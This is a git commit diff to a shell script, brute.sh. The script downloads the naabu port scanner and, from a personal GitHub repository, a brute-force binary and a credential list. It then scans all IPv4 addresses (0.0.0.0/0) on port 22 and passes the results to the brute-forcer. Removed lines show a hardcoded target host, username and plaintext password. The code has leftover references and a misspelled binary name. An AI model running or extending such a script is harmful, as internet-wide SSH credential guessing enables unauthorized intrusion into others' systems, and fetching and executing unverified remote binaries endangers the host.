eb27b3bd311c2945b13fd2ccf2efd78bdd366921
root <logical>
2026-08-02 08:39:49 -0500

    ok

--- scripts/brute.sh
+++ scripts/brute.sh
@@ -10,47 +10,27 @@
 
 go_url='https://go.dev/dl/go1.26.5.linux-amd64.tar.gz'
 url_naabu='https://github.com/projectdiscovery/naabu/archive/refs/tags/v2.6.1.tar.gz'
-url_brutus='https://github.com/praetorian-inc/brutus/releases/download/v1.10.0/brutus-linux-amd64.tar.gz' 
-creds='https://github.com/atilabyte/golang/raw/refs/heads/master/creds.txt'
+url_brutus='https://github.com/atilabyte/golang/raw/refs/heads/master/brute' #my tool of brute force very simple
 
 
 
 
 brute() {
 
-
-
-
-
-
 cd /var/tmp/naabu-2.6.1/cmd/naabu
-
 
 wget $url_brutus  -O   brutus || curl -L $url_brutus  -o  brutus #install brutus
 wget $creds  -O  lista.txt   || curl -L  $creds  -o lista.txt  #list of pass  && users 
 
-tar -xf brutus
-
 chmod  +x brutus 
 
-
-#timeout  120s     ./nabu  -p 22    -host    0.0.0.0/0     >    ips_nabu  #ssh
-
+timeout  5s     ./nabu  -p 22    -host    0.0.0.0/0     >    ips_nabu  #ssh
 
 
-grep -v "^127\." ips_nabu >  my_ips
-
-
-
-
-#./brutus creds   --targets-file   my_ips      -U  lista.txt   -P  lista.txt  -q      >>     /var/tmp/my_ips.txt
-
-
-./brutus  creds --target  192.168.1.24:22   -u logical -p atilalima123  -q   --json   >>     /var/tmp/my_ips.txt
+grep -v "^127\." ips_nabu >  ips.txt
 
  
-
-
+timeout  5s  ./brutus 
 
  
 
